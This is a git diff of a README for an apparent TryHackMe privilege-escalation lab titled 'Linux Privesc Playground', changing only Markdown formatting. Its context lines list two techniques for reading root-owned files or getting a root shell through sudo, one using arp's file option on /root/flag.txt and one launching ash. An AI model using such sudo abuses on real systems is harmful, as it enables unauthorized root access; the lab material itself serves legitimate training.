@@ -1,8 +1,8 @@
-#Linux Privesc Playground
+# Linux Privesc Playground
 
-##100 Ways of capturing root flags
+## 100 Ways of capturing root flags
 
-https://tryhackme.com/room/privescplayground
+[link to room](https://tryhackme.com/room/privescplayground)
 
 1. sudo arp -v -f "/root/flag.txt"
 2. sudo ash
